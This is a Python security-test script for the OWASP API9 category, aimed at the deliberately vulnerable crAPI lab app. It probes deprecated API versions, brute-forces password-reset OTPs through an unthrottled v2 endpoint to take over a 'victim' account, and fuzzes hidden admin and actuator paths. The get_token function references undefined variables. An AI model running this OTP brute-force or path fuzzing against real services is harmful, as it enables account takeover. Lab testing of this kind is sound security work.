#!/usr/bin/env python3
"""
OWASP API Security Top 10:2023 - API9: Improper Inventory Management
Target: crAPI running on Docker (default port 8888)

Tests for:
  - Active deprecated API versions (v1, v2 where v3 is current)
  - OTP endpoint version downgrade bypass (v3→v2 removes rate limiting)
  - Unadvertised/shadow endpoints discoverable by fuzzing version paths
  - Inconsistent protection between API versions
"""

import requests
import json
import sys

from crapi_config import BASE_URL, USER1_EMAIL, USER1_PASSWORD, USER2_EMAIL, USER2_PASSWORD
VICTIM_EMAIL = USER2_EMAIL





def get_token():
    r = requests.post(f"{BASE_URL}/identity/api/auth/login",
                      json={"email": USER_EMAIL, "password": USER_PASSWORD})
    if r.status_code == 200:
        return r.json().get("token")
    return None


def test_deprecated_version_active(token):
    """
    API9 Test: Check if older API versions are still live and accessible.
    crAPI intentionally keeps v2 of the OTP endpoint active alongside v3.
    """
    print(f"\n[API9:Inventory] Deprecated API Version Discovery")
    headers = {"Authorization": f"Bearer {token}"}

    # Map of endpoints to test across API versions
    endpoint_versions = [
        # (base_path, versions_to_test, method, body)
        ("/identity/api/auth/v{v}/check-otp",
            [1, 2, 3],
            "POST",
            {"email": VICTIM_EMAIL, "otp": "0000", "password": "Test!1234"}),

        ("/identity/api/v{v}/user/dashboard",
            [1, 2, 3],
            "GET",
            None),

        ("/identity/api/v{v}/vehicle/vehicles",
            [1, 2, 3],
            "GET",
            None),

        ("/workshop/api/v{v}/mechanic/",
            [1, 2, 3],
            "GET",
            None),

        ("/community/api/v{v}/community/posts/recent",
            [1, 2, 3],
            "GET",
            None),
    ]

    active_deprecated = []

    for path_template, versions, method, body in endpoint_versions:
        print(f"\n  Endpoint: {path_template}")
        responses_by_version = {}

        for v in versions:
            path = path_template.format(v=v)
            url = f"{BASE_URL}{path}"

            try:
                if method == "GET":
                    r = requests.get(url, headers=headers, timeout=5)
                else:
                    r = requests.post(url, headers=headers, json=body, timeout=5)
                responses_by_version[v] = r.status_code
                print(f"    v{v}: HTTP {r.status_code}", end="")

                if r.status_code not in (404, 405):
                    print(f" ← ACTIVE", end="")
                    if v < max(versions):
                        print(f" [DEPRECATED VERSION STILL LIVE]", end="")
                        active_deprecated.append(f"{method} {path_template.format(v=v)}")
                print()
            except requests.exceptions.ConnectionError:
                print(f"    v{v}: Connection error")

        # Check for version inconsistency (different behavior)
        statuses = list(responses_by_version.values())
        if len(set(statuses)) > 1:
            print(f"    [INCONSISTENCY] Different responses across versions: {responses_by_version}")

    if active_deprecated:
        print(f"\n  [VULNERABLE] {len(active_deprecated)} deprecated endpoints still active:")
        for ep in active_deprecated:
            print(f"    - {ep}")
        return True
    else:
        print(f"\n  [PROTECTED] No deprecated API versions found active")
        return False


def test_otp_version_downgrade(victim_email):
    """
    API9 Test: THE classic crAPI Inventory Management vuln.
    v3 OTP endpoint has rate limiting; v2 does not.
    An attacker downgrades from v3 to v2 to brute-force OTPs.
    """
    print(f"\n[API9:Inventory] OTP Endpoint Version Downgrade (v3→v2)")
    print(f"  Victim: {victim_email}")

    # Trigger OTP
    r = requests.post(f"{BASE_URL}/identity/api/auth/forget-password",
                      json={"email": victim_email})
    print(f"  Trigger OTP (forget-password): HTTP {r.status_code}")

    if r.status_code not in (200, 201):
        print(f"  [WARN] Could not trigger OTP for {victim_email}: {r.text[:100]}")
        print(f"  [INFO] Ensure user2 is registered via the crAPI UI")

    # Test a few OTPs on v3 to demonstrate rate limit
    print(f"\n  Testing v3 endpoint (should rate-limit):")
    v3_limited = False
    for otp in range(1000, 1006):
        r3 = requests.post(f"{BASE_URL}/identity/api/auth/v3/check-otp",
                           json={"email": victim_email, "otp": str(otp), "password": "P@ss!1"})
        print(f"    v3 OTP {otp} → HTTP {r3.status_code}: {r3.text[:60]}")
        if r3.status_code >= 500 or "limit" in r3.text.lower() or "attempt" in r3.text.lower():
            v3_limited = True
            print(f"    [RATE LIMIT HIT] v3 is protected")
            break

    # Re-trigger OTP (previous attempts may have invalidated it)
    requests.post(f"{BASE_URL}/identity/api/auth/forget-password", json={"email": victim_email})

    # Now test v2 - should NOT rate limit
    print(f"\n  Testing v2 endpoint (should NOT rate-limit - deprecated!):")
    v2_not_limited = True
    for otp in range(1000, 1010):
        r2 = requests.post(f"{BASE_URL}/identity/api/auth/v2/check-otp",
                           json={"email": victim_email, "otp": str(otp), "password": "P@ss!1"})
        print(f"    v2 OTP {otp} → HTTP {r2.status_code}: {r2.text[:60]}")
        if r2.status_code >= 429 or "limit" in r2.text.lower():
            v2_not_limited = False
            print(f"    [PROTECTED] v2 also rate-limits on this deployment")
            break
        if r2.status_code == 200:
            print(f"    [CRITICAL] Account compromised via OTP brute-force on v2!")
            return True

    if v2_not_limited:
        print(f"\n  [VULNERABLE] v2 OTP endpoint has NO rate limiting!")
        print(f"  [VULNERABLE] Attacker can brute-force all 10,000 OTP values via v2")
        if v3_limited:
            print(f"  [CONFIRMED] v3 rate-limits but v2 does not — classic inventory failure!")
        return True

    return False


def test_shadow_endpoint_discovery(token):
    """
    API9 Test: Probe for shadow/undocumented endpoints via common path patterns.
    """
    print(f"\n[API9:Inventory] Shadow Endpoint Discovery")
    headers = {"Authorization": f"Bearer {token}"}

    shadow_paths = [
        "/identity/api/v2/admin/users",
        "/identity/api/v2/admin/all",
        "/identity/api/internal/users",
        "/workshop/api/internal/mechanic",
        "/workshop/api/v2/admin/orders",
        "/community/api/v2/admin/posts",
        "/identity/api/v2/user/all",
        "/api/health",
        "/api/status",
        "/actuator",
        "/actuator/health",
        "/actuator/env",
        "/actuator/beans",
        "/metrics",
    ]

    found_shadows = []
    for path in shadow_paths:
        url = f"{BASE_URL}{path}"
        r = requests.get(url, headers=headers, timeout=5)
        if r.status_code not in (404,):
            found_shadows.append((path, r.status_code, r.text[:80]))
            indicator = "[ACCESSIBLE]" if r.status_code == 200 else f"[HTTP {r.status_code}]"
            print(f"  {indicator} {path}: {r.text[:80]}")
        else:
            print(f"  [404]       {path}")

    if found_shadows:
        accessible = [(p, s, b) for p, s, b in found_shadows if s == 200]
        print(f"\n  [VULNERABLE] {len(accessible)} shadow endpoints accessible (200 OK)!")
        for p, s, b in accessible:
            print(f"    - {p}: {b}")
        return True
    else:
        print(f"\n  [PROTECTED] No shadow endpoints found")
        return False


def main():
    print("=" * 60)
    print("  crAPI - API9: Improper Inventory Management")
    print("=" * 60)
    print(f"\nTarget: {BASE_URL}")

    token = get_token()
    if not token:
        print("[ERROR] Authentication failed. Check USER_EMAIL/USER_PASSWORD.")
        sys.exit(1)
    print(f"[AUTH] Token acquired: {token[:40]}...")

    results = []
    results.append(("Deprecated API Versions Active",   test_deprecated_version_active(token)))
    results.append(("OTP Endpoint Version Downgrade",   test_otp_version_downgrade(VICTIM_EMAIL)))
    results.append(("Shadow Endpoint Discovery",         test_shadow_endpoint_discovery(token)))

    print("\n" + "=" * 60)
    print("  RESULTS SUMMARY")
    print("=" * 60)
    for name, vuln in results:
        status = "VULNERABLE ⚠️ " if vuln else "PROTECTED  ✅"
        print(f"  {status}  {name}")
    print()


if __name__ == "__main__":
    main()
